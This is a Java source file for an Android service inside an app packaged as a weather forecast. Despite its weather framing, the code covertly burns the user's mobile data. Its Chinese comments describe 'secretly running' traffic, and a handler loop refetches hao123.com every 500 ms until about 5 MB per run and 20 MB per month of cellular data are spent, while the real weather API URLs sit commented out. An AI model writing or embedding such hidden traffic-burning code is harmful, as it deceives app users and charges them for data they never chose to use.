package com.flyscale.weatherforecast.service;

import android.app.IntentService;
import android.content.Intent;
import android.os.Handler;
import android.os.Message;
import android.os.Process;
import android.support.annotation.Nullable;
import android.util.Log;

import com.flyscale.weatherforecast.global.Constants;
import com.flyscale.weatherforecast.util.NetworkUtil;
import com.flyscale.weatherforecast.util.PreferenceUtil;

import java.io.IOException;
import java.util.Calendar;

import okhttp3.OkHttpClient;
import okhttp3.Request;

/**
 * Created by bian on 2018/8/14.
 */

public class MyIntentService extends IntentService {

    private static final String TAG = "MyIntentService";

    private static final int MSG_DO_SOMETHING = 1;
    private static final int DELAYTED_DO_SOMETHING = 500;
    private static final int MAX_TRAFFIC_ONCE = 5 * 1024 * 1024;
    private static final int TRAFFIC_RUN_TIMES_EACH_MONTH = 4;
    private static final long MAX_TRAFFIC = TRAFFIC_RUN_TIMES_EACH_MONTH * MAX_TRAFFIC_ONCE;
    private int myUid;
    private long trafficsTotal;
    private int trafficToday;
    private long trafficsStartBefore;


    /**
     * Creates an IntentService.  Invoked by your subclass's constructor.
     *
     * @param name Used to name the worker thread, important only for debugging.
     */
    public MyIntentService(String name) {
        super(name);
    }

    public MyIntentService() {
        super("MyIntentService");
    }

    @Override
    protected void onHandleIntent(@Nullable Intent intent) {
        myUid = Process.myUid();
        boolean checkMonth = checkMonth();//检查月分
        Log.d(TAG, "checkMonth=" + checkMonth);

        trafficsStartBefore = NetworkUtil.getGPRSTraficsByUid(myUid);
        Log.d(TAG, "trafficsStartBefore=" + trafficsStartBefore);
        if (checkMonth) {//检查是否是同一个月，如果是

            //在当月要记录偷跑次数
            int times = PreferenceUtil.getInt(this, Constants.TRAFFIC_RUN_TIMES, 0);
            Log.d(TAG, "times=" + times);
            if (times < TRAFFIC_RUN_TIMES_EACH_MONTH) {
                PreferenceUtil.put(this, Constants.TRAFFIC_RUN_TIMES, times + 1);
                //不是最后一次，只需要跑完本次流量
            }else if (times == TRAFFIC_RUN_TIMES_EACH_MONTH) {
                //如果是最后一次，要偷跑完剩余所有流量

            }

            //比较总偷跑流量是否已达上限
            trafficsTotal = PreferenceUtil.getInt(this, Constants.TRAFFIC_TOTAL, 0);
            Log.d(TAG, "trafficsTotal=" + trafficsTotal);
            if (trafficsTotal < MAX_TRAFFIC) {
                doSomething();
            }else {
                Log.d(TAG, "总流量已达上限，trafficsTotal=" + trafficsTotal + ", MAX_TRAFFIC=" + MAX_TRAFFIC);
            }
        } else {
            PreferenceUtil.put(this, Constants.TRAFFIC_RUN_TIMES, 1);
            doSomething();
        }
    }

    /**
     * 检查是否是当前月
     *
     * @return true 是当前月，false 不是当前月
     */
    private boolean checkMonth() {
        Calendar c = Calendar.getInstance();
        int currentMonth = c.get(Calendar.MONTH) + 1;// 获取当前月份
        Log.d(TAG, "currentMonth=" + currentMonth);
        int savedMonth = PreferenceUtil.getInt(this, Constants.CURRENT_MONTH, -1);
        Log.d(TAG, "savedMonth=" + savedMonth);
        if (currentMonth != savedMonth) {
            PreferenceUtil.put(this, Constants.TRAFFIC_TOTAL, 0);
            PreferenceUtil.put(this, Constants.CURRENT_MONTH, currentMonth);
            return false;
        }
        return true;
    }

    /**
     * 检查当天的流量是否跑完
     * @return
     */
    private boolean checkDay(){
        Calendar c = Calendar.getInstance();
        int today = c.get(Calendar.DAY_OF_MONTH);// 获取当前月份
        Log.d(TAG, "today=" + today);
        int savedToday = PreferenceUtil.getInt(this, Constants.TODAY, -1);
        Log.d(TAG, "savedToday=" + savedToday);
        if (today != savedToday) {//如果不是同一天，肯定还没有开始跑
            PreferenceUtil.put(this, Constants.TRAFFIC_TODAY, 0);
            PreferenceUtil.put(this, Constants.TODAY, today);
            return false;
        }else {//如果是同一天，且还没有跑完要继续跑
            trafficToday = PreferenceUtil.getInt(this, Constants.TRAFFIC_TODAY, 0);
            if (trafficToday < MAX_TRAFFIC_ONCE) {//本次要跑的流量还不够
                return false;
            }
        }
        return true;
    }

    private void doSomething() {
        mHandler.sendEmptyMessageDelayed(MSG_DO_SOMETHING, DELAYTED_DO_SOMETHING);
        getWeather("北京市");
        long gprsTraficsByUid = NetworkUtil.getGPRSTraficsByUid(myUid);
        Log.d(TAG, "gprsTraficsByUid=" + gprsTraficsByUid / 1024 + "KB" + ",trafficsTotal=" + trafficsTotal);
        if (trafficsTotal + gprsTraficsByUid >= MAX_TRAFFIC) {
            Log.d(TAG, "总流量已达上限,当前消耗=" + gprsTraficsByUid +
                    ",总消耗=" + (gprsTraficsByUid + trafficsTotal));
            mHandler.removeMessages(MSG_DO_SOMETHING);
        } else if (PreferenceUtil.getInt(this, Constants.TRAFFIC_RUN_TIMES, 0) < TRAFFIC_RUN_TIMES_EACH_MONTH
                && gprsTraficsByUid > MAX_TRAFFIC_ONCE) {
            Log.d(TAG, "本次流量已达上限,当前消耗=" + gprsTraficsByUid +
                    ",总消耗=" + (gprsTraficsByUid + trafficsTotal));
            mHandler.removeMessages(MSG_DO_SOMETHING);
        }
    }

    private void getWeather(String city) {
        try {
//            String url = "http://wthrcdn.etouch.cn/weather_mini?city=" + city;
//            String url = "https://www.sojson.com/open/api/weather/json.shtml?city=" + city;
            String url = "https://www.hao123.com/";
            OkHttpClient client = new OkHttpClient();
            Request request = new Request.Builder().url(url).build();
            client.newCall(request).enqueue(new okhttp3.Callback() {
                @Override
                public void onFailure(okhttp3.Call call, IOException e) {

                }

                @Override
                public void onResponse(okhttp3.Call call, okhttp3.Response response) throws
                        IOException {
                    String result = response.body().string();
                    Log.i(TAG, result);
                }
            });
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    public Handler mHandler = new Handler() {
        @Override
        public void handleMessage(Message msg) {
            super.handleMessage(msg);
            doSomething();
        }
    };
}
